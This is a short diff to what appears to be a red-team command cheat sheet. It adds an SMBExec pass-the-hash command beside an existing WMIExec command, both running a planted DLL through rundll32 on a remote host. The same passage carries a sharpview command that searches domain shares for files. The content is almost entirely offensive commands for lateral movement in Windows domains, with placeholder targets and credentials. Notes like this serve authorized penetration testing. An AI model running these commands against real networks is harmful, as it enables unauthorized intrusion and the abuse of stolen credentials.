@@ -125,6 +125,7 @@ sharpview Find-InterestingDomainShareFile -ComputerName SERVER01
 Lateral Movement:
 ==================
 run-exe WMIExec.Program WExec -t 10.0.0.1 -u admin -d domain -p password1 -c "rundll32 c:\\users\\public\\run.dll,etp"
+run-exe SMBExec.Program SExec -t 10.0.0.1 -u admin -d domain -h <nthash> -c "rundll32 c:\\users\\public\\run.dll,etp"
 
 Socks:
 ======
